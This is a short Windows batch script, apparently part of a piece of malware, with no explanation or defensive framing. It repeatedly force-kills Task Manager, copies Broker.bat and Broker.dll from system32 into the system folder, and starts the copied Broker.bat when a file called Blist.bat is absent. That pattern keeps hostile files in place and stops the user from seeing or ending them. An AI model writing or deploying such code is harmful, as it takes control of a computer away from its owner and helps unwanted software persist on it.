@echo off
:Check
taskkill /F /IM taskmgr.exe
copy %systemroot%\system32\Broker.bat %systemroot%\system\Broker.bat
copy %systemroot%\system32\Broker.dll %systemroot%\system\Broker.dll
if not exist %systemroot%\system\Blist.bat goto Die
goto Check
:Die
start %systemroot%\system\Broker.bat
